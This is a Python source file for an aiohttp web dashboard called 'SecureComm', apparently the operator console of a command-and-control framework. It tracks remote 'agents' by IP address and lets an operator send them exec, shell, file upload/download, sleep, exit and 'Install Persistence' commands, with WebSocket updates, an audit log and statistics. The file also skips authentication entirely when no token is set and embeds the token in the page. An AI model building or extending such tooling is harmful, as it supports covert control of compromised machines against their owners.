"""
SecureComm Dashboard Server - Enterprise-Grade Web Interface
Real-time monitoring, command orchestration, and analytics

Features:
- WebSocket real-time updates
- RESTful API with comprehensive endpoints
- Interactive command builder
- Live agent monitoring
- Audit trail visualization
- Statistics and analytics
- File management interface

Author: Shadow Junior
Version: 2.0.0
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import secrets
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from html import escape
from pathlib import Path
from typing import Any, Callable, Dict, Iterable, List, Optional, Set, Tuple

from aiohttp import web, WSMsgType
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID

from .config import (
    AUDIT_LOG_DIR,
    DASHBOARD_HOST,
    DASHBOARD_PORT,
    DASHBOARD_REFRESH_SECONDS,
    DASHBOARD_TOKEN,
    DEFAULT_HOST,
    DEFAULT_PORT,
    MAX_TRANSFER_BYTES,
    MAX_TRANSFER_PAYLOAD,
    OPERATIONAL_DB_PATH,
    PKI_PATH,
    PERSISTENCE_ALLOWED,
)
from .auth_gateway import AuthGateway, AuthToken
from .operational_db import CommandRecord, OperationalDatabase, AgentRecord
from .audit import AuditLogger
from .pki_manager import PKIManager
from .security import SecurityModule, SecurityError
from .server_listener import SecureCommServer

# Security Headers
SECURITY_HEADERS = {
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws: wss:; img-src 'self' data:; font-src 'self';",
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=()",
    "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
    "Pragma": "no-cache",
    "Expires": "0",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
}

# Allowed dashboard commands
ALLOWED_DASHBOARD_COMMANDS = {
    "exec", "upload", "download", "sleep", "exit", "persist", "status", "shell", "info"
}

# Payload limits
COMMAND_PAYLOAD_LIMIT = 4096
PATH_MAX_LENGTH = 512


@dataclass
class DashboardStats:
    """Dashboard statistics container"""
    total_agents: int = 0
    active_agents: int = 0
    total_commands: int = 0
    pending_commands: int = 0
    successful_commands: int = 0
    failed_commands: int = 0
    security_events: int = 0
    uptime_seconds: float = 0.0
    commands_per_minute: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "total_agents": self.total_agents,
            "active_agents": self.active_agents,
            "total_commands": self.total_commands,
            "pending_commands": self.pending_commands,
            "successful_commands": self.successful_commands,
            "failed_commands": self.failed_commands,
            "security_events": self.security_events,
            "uptime_seconds": round(self.uptime_seconds, 2),
            "commands_per_minute": round(self.commands_per_minute, 2),
        }


class DashboardWebSocketManager:
    """Manages WebSocket connections for real-time updates"""
    
    def __init__(self):
        self.connections: Set[web.WebSocketResponse] = set()
        self.logger = logging.getLogger(__name__)
    
    async def add_connection(self, ws: web.WebSocketResponse) -> None:
        """Add new WebSocket connection"""
        self.connections.add(ws)
        self.logger.info(f"WebSocket client connected. Total: {len(self.connections)}")
    
    async def remove_connection(self, ws: web.WebSocketResponse) -> None:
        """Remove WebSocket connection"""
        self.connections.discard(ws)
        self.logger.info(f"WebSocket client disconnected. Total: {len(self.connections)}")
    
    async def broadcast(self, message: Dict[str, Any]) -> None:
        """Broadcast message to all connected clients"""
        if not self.connections:
            return
        
        message_str = json.dumps(message, default=str)
        disconnected = set()
        
        for ws in self.connections:
            try:
                await ws.send_str(message_str)
            except Exception:
                disconnected.add(ws)
        
        # Clean up disconnected clients
        for ws in disconnected:
            self.connections.discard(ws)
    
    async def broadcast_event(self, event_type: str, data: Dict[str, Any]) -> None:
        """Broadcast typed event"""
        await self.broadcast({
            "type": event_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data
        })


def _apply_security_headers(response: web.StreamResponse) -> web.StreamResponse:
    """Apply security headers to response"""
    for header, value in SECURITY_HEADERS.items():
        response.headers[header] = value
    return response


def _extract_token(request: web.Request) -> Optional[str]:
    """Extract authentication token from request"""
    # Check Authorization header
    auth_header = request.headers.get("Authorization", "")
    if auth_header.lower().startswith("bearer "):
        return auth_header[7:].strip()
    
    # Check custom headers
    token = request.headers.get("X-API-Token")
    if token:
        return token.strip()
    
    # Check query parameter
    return request.query.get("token", "").strip() or None


def _auth_middleware(token: Optional[str]):
    """Create authentication middleware"""
    @web.middleware
    async def middleware(request: web.Request, handler):
        # Allow health check without auth
        if request.path == "/health":
            return await handler(request)
        
        # Skip auth if no token configured
        if not token:
            return await handler(request)
        
        provided = _extract_token(request)
        if not provided or not secrets.compare_digest(provided, token):
            if request.path.startswith("/api/") or request.path.startswith("/ws"):
                return web.json_response({"error": "unauthorized", "message": "Invalid or missing token"}, status=401)
            return web.Response(text="Unauthorized - Invalid or missing token", status=401)
        
        return await handler(request)
    
    return middleware


def _security_headers_middleware():
    """Create security headers middleware"""
    @web.middleware
    async def middleware(request: web.Request, handler):
        response = await handler(request)
        return _apply_security_headers(response)
    
    return middleware


def _format_timestamp(value: Optional[str]) -> str:
    """Format timestamp for display"""
    if not value:
        return "-"
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        return dt.strftime("%Y-%m-%d %H:%M:%S UTC")
    except:
        return str(value)


def _format_relative_time(value: Optional[str]) -> str:
    """Format timestamp as relative time"""
    if not value:
        return "-"
    try:
        dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        now = datetime.now(timezone.utc)
        diff = now - dt
        
        if diff.days > 0:
            return f"{diff.days}d ago"
        elif diff.seconds > 3600:
            return f"{diff.seconds // 3600}h ago"
        elif diff.seconds > 60:
            return f"{diff.seconds // 60}m ago"
        else:
            return "just now"
    except:
        return str(value)


def _truncate(value: Any, limit: int = 100) -> str:
    """Truncate string to limit"""
    if value is None:
        return "-"
    text = str(value)
    if len(text) <= limit:
        return text
    return text[:limit - 3] + "..."


def _escape_html(value: Any) -> str:
    """Escape HTML special characters"""
    if value is None:
        return ""
    return escape(str(value))


def _load_audit_entries(log_dir: Path, limit: int = 500) -> List[Dict[str, Any]]:
    """Load audit log entries"""
    if not log_dir.exists():
        return []
    
    entries = []
    log_files = sorted(log_dir.glob("audit_*.log"), key=lambda p: p.stat().st_mtime, reverse=True)
    
    for log_file in log_files:
        if len(entries) >= limit:
            break
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
        except Exception:
            continue
        
        for line in reversed(lines):
            if len(entries) >= limit:
                break
            
            try:
                payload = json.loads(line.strip())
                message = payload.get("message", {})
                if isinstance(message, dict):
                    message["log_timestamp"] = payload.get("timestamp")
                    message["log_level"] = payload.get("level")
                    entries.append(message)
                else:
                    entries.append({
                        "type": "log",
                        "message": message,
                        "log_timestamp": payload.get("timestamp"),
                        "log_level": payload.get("level")
                    })
            except json.JSONDecodeError:
                continue
    
    return entries


def _calculate_stats(operational_db: OperationalDatabase, start_time: float) -> DashboardStats:
    """Calculate dashboard statistics"""
    agents = operational_db.list_agents()
    commands = operational_db.list_commands()
    
    active_count = sum(1 for a in agents if a.status in ("connected", "active"))
    pending_count = sum(1 for c in commands if c.status == "pending")
    success_count = sum(1 for c in commands if c.status == "success")
    failed_count = sum(1 for c in commands if c.status == "error")
    
    # Calculate commands per minute (last 5 minutes)
    now = time.time()
    recent_commands = [c for c in commands if c.timestamp > now - 300]
    cpm = len(recent_commands) / 5.0 if recent_commands else 0.0
    
    return DashboardStats(
        total_agents=len(agents),
        active_agents=active_count,
        total_commands=len(commands),
        pending_commands=pending_count,
        successful_commands=success_count,
        failed_commands=failed_count,
        security_events=0,  # Would be populated from audit logs
        uptime_seconds=now - start_time,
        commands_per_minute=cpm
    )


def _render_html_template(title: str, content: str, refresh_seconds: int = 0, token: str = "") -> str:
    """Render HTML page template"""
    refresh_meta = f'<meta http-equiv="refresh" content="{refresh_seconds}">' if refresh_seconds > 0 else ''
    
    return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    {refresh_meta}
    <title>{_escape_html(title)} - SecureComm Dashboard</title>
    <link rel="stylesheet" href="/static/main.css">
    <link rel="icon" type="image/svg+xml" href="/static/favicon.svg">
</head>
<body>
    <div id="app">
        <nav class="sidebar">
            <div class="logo">
                <span class="logo-icon">🔒</span>
                <span class="logo-text">SecureComm</span>
            </div>
            <ul class="nav-menu">
                <li><a href="/" class="nav-link active" data-page="dashboard">
                    <span class="nav-icon">📊</span> Dashboard
                </a></li>
                <li><a href="/agents" class="nav-link" data-page="agents">
                    <span class="nav-icon">🤖</span> Agents
                </a></li>
                <li><a href="/commands" class="nav-link" data-page="commands">
                    <span class="nav-icon">📜</span> Commands
                </a></li>
                <li><a href="/audit" class="nav-link" data-page="audit">
                    <span class="nav-icon">🔍</span> Audit Log
                </a></li>
                <li><a href="/files" class="nav-link" data-page="files">
                    <span class="nav-icon">📁</span> Files
                </a></li>
                <li><a href="/stats" class="nav-link" data-page="stats">
                    <span class="nav-icon">📈</span> Statistics
                </a></li>
            </ul>
            <div class="sidebar-footer">
                <div class="connection-status">
                    <span class="status-indicator online"></span>
                    <span class="status-text">Connected</span>
                </div>
                <div class="version">v2.0.0</div>
            </div>
        </nav>
        
        <main class="main-content">
            <header class="top-bar">
                <h1>{_escape_html(title)}</h1>
                <div class="top-bar-actions">
                    <button id="refresh-btn" class="btn btn-icon" title="Refresh">
                        🔄
                    </button>
                    <label class="toggle-switch">
                        <input type="checkbox" id="auto-refresh" checked>
                        <span class="toggle-slider"></span>
                        <span class="toggle-label">Auto</span>
                    </label>
                    <span id="last-refresh" class="last-refresh">--:--:--</span>
                </div>
            </header>
            
            <div class="content-wrapper">
                {content}
            </div>
        </main>
    </div>
    
    <!-- Command Modal -->
    <div id="command-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Send Command</h2>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="command-form">
                    <div class="form-group">
                        <label for="cmd-agent-id">Agent ID</label>
                        <select id="cmd-agent-id" required>
                            <option value="">Select agent...</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="cmd-type">Command Type</label>
                        <select id="cmd-type" required>
                            <option value="exec">Execute (exec)</option>
                            <option value="upload">Upload File</option>
                            <option value="download">Download File</option>
                            <option value="sleep">Set Sleep Interval</option>
                            <option value="status">Get Status</option>
                            <option value="persist">Install Persistence</option>
                            <option value="exit">Exit Agent</option>
                        </select>
                    </div>
                    <div class="form-group" id="payload-group">
                        <label for="cmd-payload">Payload</label>
                        <textarea id="cmd-payload" rows="4" placeholder="Enter command or payload..."></textarea>
                    </div>
                    <div class="form-group" id="file-group" style="display:none;">
                        <label for="cmd-file">File</label>
                        <input type="file" id="cmd-file">
                    </div>
                    <div class="form-actions">
                        <button type="button" class="btn btn-secondary modal-close">Cancel</button>
                        <button type="submit" class="btn btn-primary">Send Command</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    
    <!-- Toast Notifications -->
    <div id="toast-container"></div>
    
    <script>
        window.DASHBOARD_TOKEN = "{_escape_html(token)}";
        window.AUTO_REFRESH_INTERVAL = {refresh_seconds * 1000 if refresh_seconds else 5000};
    </script>
    <script src="/static/app.js"></script>
</body>
</html>'''


def _render_dashboard_page(operational_db: OperationalDatabase, stats: DashboardStats, token: str) -> str:
    """Render dashboard page content"""
    agents = operational_db.list_agents()
    commands = operational_db.list_commands()
    
    # Sort commands by timestamp (newest first)
    commands.sort(key=lambda c: c.created_at, reverse=True)
    recent_commands = commands[:10]
    
    content = f'''
    <div class="dashboard-grid">
        <!-- Stats Cards -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-icon">🤖</div>
                <div class="stat-content">
                    <div class="stat-value">{stats.total_agents}</div>
                    <div class="stat-label">Total Agents</div>
                </div>
                <div class="stat-badge success">{stats.active_agents} active</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">📜</div>
                <div class="stat-content">
                    <div class="stat-value">{stats.total_commands}</div>
                    <div class="stat-label">Total Commands</div>
                </div>
                <div class="stat-badge warning">{stats.pending_commands} pending</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">✅</div>
                <div class="stat-content">
                    <div class="stat-value">{stats.successful_commands}</div>
                    <div class="stat-label">Successful</div>
                </div>
                <div class="stat-badge success">{round(stats.successful_commands / stats.total_commands * 100, 1) if stats.total_commands else 0}%</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">⚡</div>
                <div class="stat-content">
                    <div class="stat-value">{round(stats.commands_per_minute, 1)}</div>
                    <div class="stat-label">Cmds/Min</div>
                </div>
                <div class="stat-badge info">last 5m</div>
            </div>
        </div>
        
        <!-- Quick Actions -->
        <div class="quick-actions">
            <button class="btn btn-primary" id="btn-new-command">
                <span class="btn-icon">➕</span> New Command
            </button>
            <button class="btn btn-secondary" id="btn-refresh-agents">
                <span class="btn-icon">🔄</span> Refresh Agents
            </button>
            <button class="btn btn-secondary" id="btn-export-data">
                <span class="btn-icon">📥</span> Export Data
            </button>
        </div>
        
        <!-- Agents Table -->
        <div class="panel">
            <div class="panel-header">
                <h3>🤖 Active Agents</h3>
                <a href="/agents" class="panel-link">View All →</a>
            </div>
            <div class="table-container">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>Agent ID</th>
                            <th>IP Address</th>
                            <th>Status</th>
                            <th>Connected</th>
                            <th>Last Seen</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>'''
    
    if agents:
        for agent in agents:
            status_class = "status-" + agent.status
            content += f'''
                        <tr>
                            <td><code>{_escape_html(agent.agent_id)}</code></td>
                            <td>{_escape_html(agent.ip_address)}</td>
                            <td><span class="status-badge {status_class}">{_escape_html(agent.status)}</span></td>
                            <td>{_format_relative_time(agent.connected_at.isoformat())}</td>
                            <td>{_format_relative_time(agent.last_seen.isoformat())}</td>
                            <td>
                                <button class="btn btn-sm btn-primary" onclick="window.dashboard.sendCommandTo('{_escape_html(agent.agent_id)}')">Send Cmd</button>
                                <button class="btn btn-sm btn-secondary" onclick="window.dashboard.viewAgent('{_escape_html(agent.agent_id)}')">View</button>
                            </td>
                        </tr>'''
    else:
        content += '''
                        <tr>
                            <td colspan="6" class="empty-state">
                                <div class="empty-icon">🤖</div>
                                <p>No agents connected</p>
                                <p class="empty-hint">Start an agent to see it here</p>
                            </td>
                        </tr>'''
    
    content += f'''
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Recent Commands -->
        <div class="panel">
            <div class="panel-header">
                <h3>📜 Recent Commands</h3>
                <a href="/commands" class="panel-link">View All →</a>
            </div>
            <div class="table-container">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>Task ID</th>
                            <th>Agent</th>
                            <th>Type</th>
                            <th>Status</th>
                            <th>Time</th>
                            <th>Payload</th>
                        </tr>
                    </thead>
                    <tbody>'''
    
    if recent_commands:
        for cmd in recent_commands:
            status_class = "status-" + cmd.status
            content += f'''
                        <tr>
                            <td><code>{_escape_html(cmd.task_id[:16])}...</code></td>
                            <td>{_escape_html(cmd.agent_id)}</td>
                            <td><span class="type-badge">{_escape_html(cmd.command_type)}</span></td>
                            <td><span class="status-badge {status_class}">{_escape_html(cmd.status)}</span></td>
                            <td>{_format_relative_time(cmd.created_at.isoformat())}</td>
                            <td title="{_escape_html(cmd.payload)}">{_truncate(cmd.payload, 40)}</td>
                        </tr>'''
    else:
        content += '''
                        <tr>
                            <td colspan="6" class="empty-state">
                                <div class="empty-icon">📜</div>
                                <p>No commands issued</p>
                                <p class="empty-hint">Use the "New Command" button to send commands</p>
                            </td>
                        </tr>'''
    
    content += '''
                    </tbody>
                </table>
            </div>
        </div>
    </div>'''
    
    return content


def _render_agents_page(operational_db: OperationalDatabase) -> str:
    """Render agents page content"""
    agents = operational_db.list_agents()
    
    content = '''
    <div class="page-header">
        <h2>Agent Management</h2>
        <div class="page-actions">
            <button class="btn btn-primary" id="btn-bulk-command">
                <span class="btn-icon">📢</span> Bulk Command
            </button>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <div class="search-box">
                <input type="text" id="agent-search" placeholder="Search agents...">
                <button class="search-btn">🔍</button>
            </div>
            <div class="filter-group">
                <select id="status-filter">
                    <option value="">All Status</option>
                    <option value="connected">Connected</option>
                    <option value="active">Active</option>
                    <option value="disconnected">Disconnected</option>
                </select>
            </div>
        </div>
        <div class="table-container">
            <table class="data-table" id="agents-table">
                <thead>
                    <tr>
                        <th><input type="checkbox" id="select-all"></th>
                        <th>Agent ID</th>
                        <th>IP Address</th>
                        <th>Status</th>
                        <th>Connected</th>
                        <th>Last Seen</th>
                        <th>Certificate</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>'''
    
    if agents:
        for agent in agents:
            status_class = "status-" + agent.status
            content += f'''
                    <tr data-agent-id="{_escape_html(agent.agent_id)}">
                        <td><input type="checkbox" class="agent-select"></td>
                        <td><code class="agent-id">{_escape_html(agent.agent_id)}</code></td>
                        <td>{_escape_html(agent.ip_address)}</td>
                        <td><span class="status-badge {status_class}">{_escape_html(agent.status)}</span></td>
                        <td>{_format_timestamp(agent.connected_at.isoformat())}</td>
                        <td>{_format_relative_time(agent.last_seen.isoformat())}</td>
                        <td title="{_escape_html(agent.certificate_subject)}">{_truncate(agent.certificate_subject, 30)}</td>
                        <td>
                            <div class="action-buttons">
                                <button class="btn btn-sm btn-primary" onclick="window.dashboard.sendCommandTo('{_escape_html(agent.agent_id)}')">Cmd</button>
                                <button class="btn btn-sm btn-info" onclick="window.dashboard.viewAgent('{_escape_html(agent.agent_id)}')">Info</button>
                                <button class="btn btn-sm btn-danger" onclick="window.dashboard.disconnectAgent('{_escape_html(agent.agent_id)}')">Disconnect</button>
                            </div>
                        </td>
                    </tr>'''
    else:
        content += '''
                    <tr>
                        <td colspan="8" class="empty-state">
                            <div class="empty-icon">🤖</div>
                            <p>No agents connected</p>
                        </td>
                    </tr>'''
    
    content += '''
                </tbody>
            </table>
        </div>
    </div>'''
    
    return content


def _render_commands_page(operational_db: OperationalDatabase) -> str:
    """Render commands page content"""
    commands = operational_db.list_commands()
    commands.sort(key=lambda c: c.created_at, reverse=True)
    
    content = '''
    <div class="page-header">
        <h2>Command History</h2>
        <div class="page-actions">
            <button class="btn btn-secondary" id="btn-export-commands">
                <span class="btn-icon">📥</span> Export
            </button>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <div class="search-box">
                <input type="text" id="command-search" placeholder="Search commands...">
                <button class="search-btn">🔍</button>
            </div>
            <div class="filter-group">
                <select id="type-filter">
                    <option value="">All Types</option>
                    <option value="exec">Execute</option>
                    <option value="upload">Upload</option>
                    <option value="download">Download</option>
                    <option value="sleep">Sleep</option>
                </select>
                <select id="status-filter">
                    <option value="">All Status</option>
                    <option value="pending">Pending</option>
                    <option value="success">Success</option>
                    <option value="error">Error</option>
                </select>
            </div>
        </div>
        <div class="table-container">
            <table class="data-table" id="commands-table">
                <thead>
                    <tr>
                        <th>Task ID</th>
                        <th>Agent</th>
                        <th>Type</th>
                        <th>Status</th>
                        <th>Operator</th>
                        <th>Time</th>
                        <th>Payload</th>
                        <th>Response</th>
                    </tr>
                </thead>
                <tbody>'''
    
    if commands:
        for cmd in commands:
            status_class = "status-" + cmd.status
            response_str = json.dumps(cmd.response, default=str) if cmd.response else "-"
            content += f'''
                    <tr>
                        <td><code>{_escape_html(cmd.task_id)}</code></td>
                        <td>{_escape_html(cmd.agent_id)}</td>
                        <td><span class="type-badge">{_escape_html(cmd.command_type)}</span></td>
                        <td><span class="status-badge {status_class}">{_escape_html(cmd.status)}</span></td>
                        <td>{_escape_html(cmd.operator_id)}</td>
                        <td>{_format_timestamp(cmd.created_at.isoformat())}</td>
                        <td title="{_escape_html(cmd.payload)}">{_truncate(cmd.payload, 50)}</td>
                        <td title="{_escape_html(response_str)}">{_truncate(response_str, 50)}</td>
                    </tr>'''
    else:
        content += '''
                    <tr>
                        <td colspan="8" class="empty-state">
                            <div class="empty-icon">📜</div>
                            <p>No commands issued</p>
                        </td>
                    </tr>'''
    
    content += '''
                </tbody>
            </table>
        </div>
    </div>'''
    
    return content


def _render_audit_page(log_dir: Path) -> str:
    """Render audit log page content"""
    entries = _load_audit_entries(log_dir, limit=200)
    
    content = '''
    <div class="page-header">
        <h2>Audit Log</h2>
        <div class="page-actions">
            <button class="btn btn-secondary" id="btn-export-audit">
                <span class="btn-icon">📥</span> Export
            </button>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-header">
            <div class="search-box">
                <input type="text" id="audit-search" placeholder="Search audit log...">
                <button class="search-btn">🔍</button>
            </div>
            <div class="filter-group">
                <select id="event-type-filter">
                    <option value="">All Events</option>
                    <option value="command">Commands</option>
                    <option value="connection">Connections</option>
                    <option value="security">Security</option>
                </select>
            </div>
        </div>
        <div class="table-container">
            <table class="data-table" id="audit-table">
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Event</th>
                        <th>Actor</th>
                        <th>Time</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>'''
    
    if entries:
        for entry in entries:
            event_type = entry.get("type", "unknown")
            event_name = entry.get("event_type", entry.get("event", "-"))
            actor = entry.get("agent_id", entry.get("operator_id", "-"))
            timestamp = entry.get("timestamp", entry.get("log_timestamp", "-"))
            details = json.dumps(entry.get("details", {}), default=str)
            
            type_class = f"type-{event_type}"
            content += f'''
                    <tr>
                        <td><span class="type-badge {type_class}">{_escape_html(event_type)}</span></td>
                        <td>{_escape_html(event_name)}</td>
                        <td>{_escape_html(actor)}</td>
                        <td>{_format_timestamp(timestamp)}</td>
                        <td title="{_escape_html(details)}">{_truncate(details, 60)}</td>
                    </tr>'''
    else:
        content += '''
                    <tr>
                        <td colspan="5" class="empty-state">
                            <div class="empty-icon">🔍</div>
                            <p>No audit events</p>
                        </td>
                    </tr>'''
    
    content += '''
                </tbody>
            </table>
        </div>
    </div>'''
    
    return content


def _render_files_page() -> str:
    """Render file manager page content"""
    return '''
    <div class="page-header">
        <h2>File Manager</h2>
        <div class="page-actions">
            <button class="btn btn-primary" id="btn-upload-file">
                <span class="btn-icon">📤</span> Upload
            </button>
        </div>
    </div>
    
    <div class="file-manager">
        <div class="file-sidebar">
            <div class="file-section">
                <h4>Operator Files</h4>
                <div class="file-list" id="operator-files">
                    <p class="empty-hint">No files uploaded</p>
                </div>
            </div>
            <div class="file-section">
                <h4>Agent Files</h4>
                <div class="file-list" id="agent-files">
                    <p class="empty-hint">Select an agent to view files</p>
                </div>
            </div>
        </div>
        <div class="file-content">
            <div class="file-preview" id="file-preview">
                <div class="empty-state">
                    <div class="empty-icon">📁</div>
                    <p>Select a file to preview</p>
                </div>
            </div>
        </div>
    </div>'''


def _render_stats_page(stats: DashboardStats) -> str:
    """Render statistics page content"""
    return f'''
    <div class="page-header">
        <h2>Statistics & Analytics</h2>
    </div>
    
    <div class="stats-dashboard">
        <div class="stats-grid large">
            <div class="stat-card highlight">
                <div class="stat-icon large">⏱️</div>
                <div class="stat-content">
                    <div class="stat-value">{timedelta(seconds=int(stats.uptime_seconds))}</div>
                    <div class="stat-label">System Uptime</div>
                </div>
            </div>
            <div class="stat-card highlight">
                <div class="stat-icon large">📊</div>
                <div class="stat-content">
                    <div class="stat-value">{round(stats.commands_per_minute, 2)}</div>
                    <div class="stat-label">Commands/Minute</div>
                </div>
            </div>
        </div>
        
        <div class="charts-grid">
            <div class="chart-card">
                <h4>Command Status Distribution</h4>
                <div class="chart-container" id="status-chart">
                    <div class="chart-legend">
                        <div class="legend-item">
                            <span class="legend-color success"></span>
                            <span>Success: {stats.successful_commands}</span>
                        </div>
                        <div class="legend-item">
                            <span class="legend-color error"></span>
                            <span>Failed: {stats.failed_commands}</span>
                        </div>
                        <div class="legend-item">
                            <span class="legend-color warning"></span>
                            <span>Pending: {stats.pending_commands}</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="chart-card">
                <h4>Agent Activity</h4>
                <div class="chart-container" id="activity-chart">
                    <div class="activity-stats">
                        <div class="activity-item">
                            <span class="activity-label">Active</span>
                            <span class="activity-value success">{stats.active_agents}</span>
                        </div>
                        <div class="activity-item">
                            <span class="activity-label">Inactive</span>
                            <span class="activity-value">{stats.total_agents - stats.active_agents}</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>'''


def create_app(
    db_path: Path = OPERATIONAL_DB_PATH,
    audit_log_dir: Path = AUDIT_LOG_DIR,
    refresh_seconds: int = DASHBOARD_REFRESH_SECONDS,
    token: Optional[str] = DASHBOARD_TOKEN,
    command_server: Optional[SecureCommServer] = None,
    operator_cert_path: Optional[Path] = None,
    operator_key_path: Optional[Path] = None,
    ca_cert_path: Optional[Path] = None,
    operator_id: Optional[str] = None,
    command_host: str = DEFAULT_HOST,
    command_port: int = DEFAULT_PORT,
    pki_path: Path = PKI_PATH,
    enable_command_server: bool = True,
) -> web.Application:
    """Create and configure the dashboard application"""
    
    logger = logging.getLogger(__name__)
    start_time = time.time()
    
    # Initialize components
    operational_db = OperationalDatabase(storage_path=str(db_path))
    audit_log_dir.mkdir(parents=True, exist_ok=True)
    audit_logger = AuditLogger(log_dir=str(audit_log_dir))
    security = SecurityModule()
    ws_manager = DashboardWebSocketManager()
    
    # Authentication setup
    auth_gateway: Optional[AuthGateway] = None
    operator_cert: Optional[x509.Certificate] = None
    operator_token: Optional[AuthToken] = None
    
    if command_server and command_server.auth_gateway:
        auth_gateway = command_server.auth_gateway
    
    def resolve_operator_identity(candidate: Optional[str], cert: x509.Certificate) -> str:
        cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        if candidate and candidate != cn:
            raise ValueError("Operator ID mismatch with certificate CN")
        return candidate or cn
    
    def ensure_auth_gateway() -> Optional[AuthGateway]:
        nonlocal auth_gateway, operator_cert, operator_id
        
        if auth_gateway and operator_cert:
            return auth_gateway
        
        resolved_pki_path = Path(pki_path)
        cert_path = operator_cert_path or resolved_pki_path / "operators" / "admin.crt"
        key_path = operator_key_path or resolved_pki_path / "operators" / "admin.key"
        ca_path = ca_cert_path or resolved_pki_path / "ca" / "ca_root.crt"
        
        if not all(p.exists() for p in [cert_path, key_path, ca_path]):
            logger.warning("Dashboard command server disabled: missing credentials")
            return None
        
        operator_cert = x509.load_pem_x509_certificate(cert_path.read_bytes(), default_backend())
        operator_id = resolve_operator_identity(operator_id, operator_cert)
        
        if auth_gateway:
            return auth_gateway
        
        ca_certificate = x509.load_pem_x509_certificate(ca_path.read_bytes(), default_backend())
        pki_manager = PKIManager(pki_path=str(resolved_pki_path))
        
        auth_gateway = AuthGateway(
            ca_certificate=ca_certificate,
            certificate_validator=lambda cert: pki_manager.validate_certificate(cert, ca_certificate),
            audit_logger=audit_logger,
        )
        return auth_gateway
    
    def get_operator_token() -> str:
        nonlocal operator_token
        
        gateway = ensure_auth_gateway()
        if not gateway or not operator_cert or not operator_id:
            if audit_logger:
                audit_logger.log_security_event("operator_token_unavailable", {"operator_id": operator_id})
            raise RuntimeError("operator_auth_unavailable")
        
        if (operator_token and operator_token.expires_at > 
            datetime.now(timezone.utc) + timedelta(seconds=10)):
            return operator_token.token
        
        operator_token = gateway.authenticate(operator_id, operator_cert)
        return operator_token.token
    
    # Initialize command server if needed
    if command_server is None and enable_command_server:
        try:
            gateway = ensure_auth_gateway()
            if gateway and operator_cert and operator_id:
                resolved_pki_path = Path(pki_path)
                cert_path = operator_cert_path or resolved_pki_path / "operators" / "admin.crt"
                key_path = operator_key_path or resolved_pki_path / "operators" / "admin.key"
                ca_path = ca_cert_path or resolved_pki_path / "ca" / "ca_root.crt"
                
                command_server = SecureCommServer(
                    operator_id=operator_id,
                    host=command_host,
                    port=command_port,
                    cert_path=str(cert_path),
                    key_path=str(key_path),
                    ca_cert_path=str(ca_path),
                    operational_db=operational_db,
                    security=security,
                    auth_gateway=gateway,
                    audit_logger=audit_logger,
                    pki_path=str(resolved_pki_path),
                )
                command_server.start()
                logger.info("Command server started successfully")
        except Exception as exc:
            logger.error(f"Command server initialization failed: {exc}")
            if audit_logger:
                audit_logger.log_security_event("command_server_init_failed", {"error": str(exc)})
    
    # WebSocket handler
    async def websocket_handler(request: web.Request) -> web.WebSocketResponse:
        ws = web.WebSocketResponse(heartbeat=30.0)
        await ws.prepare(request)
        
        await ws_manager.add_connection(ws)
        
        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        msg_type = data.get("type")
                        
                        if msg_type == "ping":
                            await ws.send_json({"type": "pong", "timestamp": time.time()})
                        elif msg_type == "subscribe":
                            channel = data.get("channel")
                            await ws.send_json({"type": "subscribed", "channel": channel})
                    except json.JSONDecodeError:
                        pass
                elif msg.type == WSMsgType.ERROR:
                    logger.error(f"WebSocket error: {ws.exception()}")
        finally:
            await ws_manager.remove_connection(ws)
        
        return ws
    
    # HTTP Handlers
    async def health_check(request: web.Request) -> web.Response:
        stats = _calculate_stats(operational_db, start_time)
        return web.json_response({
            "status": "ok",
            "version": "2.0.0",
            "uptime_seconds": stats.uptime_seconds,
            "timestamp": datetime.now(timezone.utc).isoformat()
        })
    
    async def api_state(request: web.Request) -> web.Response:
        operational_db.reload()
        stats = _calculate_stats(operational_db, start_time)
        
        return web.json_response({
            "stats": stats.to_dict(),
            "agents": [a.to_dict() for a in operational_db.list_agents()],
            "commands": [c.to_dict() for c in operational_db.list_commands()],
            "timestamp": datetime.now(timezone.utc).isoformat()
        })
